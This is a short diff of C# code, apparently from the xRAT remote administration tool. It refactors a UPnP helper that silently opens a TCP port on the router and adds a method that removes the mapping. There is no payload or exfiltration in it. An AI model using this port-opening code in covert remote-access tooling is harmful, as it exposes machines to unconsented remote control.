@@ -34,12 +34,25 @@ namespace Core
 
                 try
                 {
-                    UPnPNAT upnpNat = new UPnPNAT();
-                    IStaticPortMappingCollection portMap = upnpNat.StaticPortMappingCollection;
-                    portMap.Add(port, "TCP", port, ipAddr, true, "xRAT 2.0.0.0 UPnP");
+                    IStaticPortMappingCollection portMap = new UPnPNAT().StaticPortMappingCollection;
+                    if (portMap != null)
+                        portMap.Add(port, "TCP", port, ipAddr, true, "xRAT 2.0 UPnP");
                 }
-                catch { return; }
+                catch
+                { }
             }).Start();
+        }
+
+        public static void RemovePort(ushort port)
+        {
+            try
+            {
+                IStaticPortMappingCollection portMap = new UPnPNAT().StaticPortMappingCollection;
+                if (portMap != null)
+                    portMap.Remove(port, "TCP");
+            }
+            catch
+            { }
         }
     }
 }
